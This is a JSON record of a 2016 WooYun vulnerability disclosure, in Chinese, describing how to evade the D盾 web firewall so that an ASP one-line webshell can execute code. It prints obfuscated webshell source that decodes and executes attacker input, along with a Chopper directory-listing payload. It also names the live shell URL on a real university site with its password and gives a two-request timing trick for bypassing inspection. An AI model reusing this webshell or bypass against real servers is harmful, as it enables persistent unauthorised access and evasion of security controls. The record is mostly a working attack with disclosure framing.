{"id": 85524, "wybug_id": "wooyun-2016-0172065", "wybug_title": "D盾一句话动态代码执行拦截bypass", "wybug_corp": "迪元素科技有限公司", "wybug_author": "RedFree", "wybug_date": "2016-01-24 21:27", "wybug_open_date": "2016-03-08 21:29", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "设计不当", "盾"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-24：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2016-03-08：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： D盾拦掉了一句话对传入的动态脚本的执行，然而我们可以以奇葩的姿势来绕过 详细说明：  一句话地址：http://sjxy.ycu.jx.cn/upfiles/Media/d2.asp 密码：z 普通的菜刀是连接不上滴。代码如下：\n<%Function decode(ByVal s, ByVal key)    For i = 1 To Len(s) Step 2        c = Mid(s, i, 2)        k = (i + 1) / 2 Mod Len(key) + 1        p = Mid(key, k, 1)        If IsNumeric(Mid(s, i, 1)) Then            decode = decode & Chr((\"&H\" & c) - p)        Else            decode = decode & Chr(\"&H\" & c & Mid(s, i + 2, 2))            i = i + 2        End If    NextEnd FunctionExecute decode(\"4A7A6C6C7A766C3169676A7869672F7B6A737C6E78762F2B7F2430357767787E6A757B31276D6C82272B3032\",\"9527\")%>\n也就是把传入的参数z经过decode函数解码后执行。把Response.Write(2333333+1)编码后(526573706F6E73652E577269746528323333333333332B3129)执行，效果如图：\n\n但当我们把菜刀的数据包编码后执行确被无情地拦截掉了：编码前代码：\nResponse.Write(\"->|\"):Dim RR:RR=decode(Request(\"k1\"),Request(\"key\")):Function FD(dt):FD=Year(dt)&\"-\":If Len(Month(dt))=1 Then:FD = FD&\"0\":End If:FD=FD&Month(dt)&\"-\":If Len(Day(dt))=1 Then:FD=FD&\"0\":End If:FD=FD&Day(dt)&\" \"&FormatDateTime(dt,4)&\":\":If Len(Second(dt))=1 Then:FD=FD&\"0\":End If:FD=FD&Second(dt):End Function:SET C=CreateObject(\"Scripting.FileSystemObject\"):Set FO=C.GetFolder(\"\"&RR&\"\"):If Err Then:Response.Write(\"ERROR:// \"&Err.Description):Err.Clear:Else:For Each F in FO.subfolders:Response.Write F.Name:Next:For Each L in FO.files:Response.Write L.Name:Next:End If:Response.Write(\"|<-\"):Response.End\n编码后：\nn\n\n数据包中已没有任何关键字，显然D盾的拦截不是在传输的过程中，D盾已可以在代码解码执行时检测到代码对一些敏感方法的调用，如FSO等组件。但当我不以动态的方式去执行代码时（写到服务器Web目录中），却可以成功获得结果。\n\n在梳理了整个过程后，可以作出的结论是D盾检查了最终执行的动态代码的内容（无论用户如何[加密]），但同样可以得出的结论是这样的检测会消耗一定的系统资源。那么如何尽可能地减少资源消耗呢？最终的测试显示，D盾检测了用户的每一个请求，但在检测后面的请求时同时会终止对前面所有请求的检查。因此一个绕过方案就诞生了，我们把第一个请求的包的动态代码构造的足够多，占用些检测时间。保证第一个请求中的动态代码还未被完成检测时，再发出第二个请求（第二个请求不包含任何动态代码GET网站的任意URL即可），那么对第一个请求的检查还未来的及检查完成就被放过去了。（注：我的方法是在动态代码前加很多0A[换行]来消耗检测时间）第一个请求：http://sjxy.ycu.jx.cn/upfiles/Media/d2.aspPOST\nz=0A0A....省略很多key=00000&k1=443A5C63616D7075735C736A78795C77656232303134303632362D335C757066696C65735C4D656469615C\n第二个请求：直接GET请求http://sjxy.ycu.jx.cn/upfiles/Media/d2.asp直接发送POST被拦截：\n\n按上面的方法，成功执行了动态代码：\n\n   漏洞证明：  \n\n\n\n   修复方案：  逻辑   版权声明：转载请注明来源 RedFree@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：8 (WooYun评价)  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 8, "Ranks": null}